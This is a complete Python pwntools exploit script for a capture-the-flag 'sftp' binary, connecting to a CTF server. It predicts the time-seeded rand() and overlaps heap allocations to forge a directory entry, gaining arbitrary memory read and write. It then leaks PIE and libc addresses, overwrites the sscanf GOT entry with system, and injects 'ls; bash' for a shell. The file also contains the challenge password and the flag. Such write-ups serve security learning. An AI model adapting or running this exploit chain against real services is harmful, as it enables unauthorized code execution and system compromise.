#!/usr/bin/env python2

from pwn import *
from ctypes import CDLL

allocated = []
overlapping = []
def rand(label):
  loc = c.rand() & 0x1FFFFFFF | 0x40000000;

  allocated.append((loc, label))
  overlapping.append(int((loc-0x40000000)/65535))

  return loc

def put(name, content):
  p.sendlineafter("sftp> ", "put " + name)
  p.sendline(str(len(content)))
  p.send(content)

def get(name):
  p.sendlineafter("sftp> ", "get " + name)
  s = int(p.recvline(keepends=False))
  return p.recvn(s)

def rm(name):
  p.sendlineafter("sftp> ", "rm " + name)

def check():
  i = 0
  seen = {}
  for m in overlapping:
    if m not in seen:
      seen[m] = i
    elif allocated[i][1] == "content" and allocated[seen[m]][1] == "entry":
      return (i, seen[m])
    elif allocated[i][1] == "entry" and allocated[seen[m]][1] == "content":
      return (seen[m], i)
    i += 1
  return None


def set_addr(addr, dist, root):
  payload = p64(root)                   # parent dir
  payload += p32(2)                     # type
  payload += "entry".ljust(20, "\x00")  # name
  payload += p64(8)                     # size
  payload += p64(addr)                  # data

  put("content", "B" * dist + payload)


def leak(addr, dist, root):
  set_addr(addr, dist, root)
  data = get("entry")

  return u64(data.ljust(8, "\x00"))

def write(addr, value, dist, root):
  set_addr(addr, dist, root)
  put("entry", p64(value))

def exploit():
  p.sendlineafter("yes", "yes")
  p.sendlineafter("password", "vakzz88U9aiE_o")

  for i in range(6):
    print "init 0x{:x}".format(rand("init"))

  while not check():
    rand("entry")
    rand("content")

  content, entry = check()

  if allocated[content][0] > allocated[entry][0]:
    print "err content after entry"
    return

  print "content {}: 0x{:x} - {}".format(content, allocated[content][0], allocated[content][1])
  print "entry {}: 0x{:x} - {}".format(entry, allocated[entry][0], allocated[entry][1])


  dist = allocated[entry][0] - allocated[content][0]

  print "dist", hex(dist)
  print "{} entry 0x{:x}".format(entry, allocated[entry][0])
  print "{} content 0x{:x}".format(content, allocated[content][0])


  entryNum = (entry - 6)/2
  contentNum = (content - 6)/2
  
  overwriteSize = dist + 48

  if contentNum < entryNum:
    for i in range(contentNum):
      put("padding", "padding" + str(i))
      rm("padding")

    put("content", "A" * overwriteSize)

    for i in range(contentNum + 1, entryNum):
      put("padding", "padding")
      rm("padding")

    put("entry", "overwrite")

  else:
    for i in range(entryNum):
      put("padding", "padding")
      rm("padding")

    put("entry", "overwrite")

    for i in range(entryNum + 1, contentNum):
      put("padding", "padding" + str(i))
      rm("padding")
    
    put("content", "A" * overwriteSize)


  print "leaking root folder: 0x{:x}".format(allocated[0][0])
  pie_leak = leak(allocated[0][0], dist, allocated[0][0])
  log.info("pie_leak: 0x{:x}".format(pie_leak))
  
  binary.address = pie_leak - 0x208be0
  log.info("pie: 0x{:x}".format(binary.address))

  puts = leak(binary.got["puts"], dist, allocated[0][0])
  log.info("puts: 0x{:x}".format(puts))

  fgets = leak(binary.got["fgets"], dist, allocated[0][0])
  log.info("fgets: 0x{:x}".format(fgets))
  libc.address = fgets - libc.symbols["fgets"]
  # https://libc.blukat.me/?q=fgets%3A0x7fc32f918ad0%2Cputs%3A0x7fc32f91a690
  
  write(binary.got["__isoc99_sscanf"], libc.symbols["system"], dist, allocated[0][0])

  p.sendlineafter("sftp>", "ls; bash")
  p.interactive()

  # CTF{Moar_Randomz_Moar_Mitigatez!}


if __name__ == "__main__":
  name = "./sftp"
  binary = ELF(name)

  libc_name = "/lib/x86_64-linux-gnu/libc-2.23.so"

  c = CDLL(libc_name)
  libc = ELF(libc_name)

  context.terminal=["tmux", "sp", "-h"]
  context.arch = "amd64"

  if len(sys.argv) > 1:
    t = c.time(0)
    c.srand(t)
    print "time {}".format(t)
    p = remote("sftp.ctfcompetition.com",1337)
  else:
    t = c.time(0)
    c.srand(t)
    print "time {}".format(t)
    p = process(name, env={})

    gdb.attach(p, """
    c
    """)

  exploit()
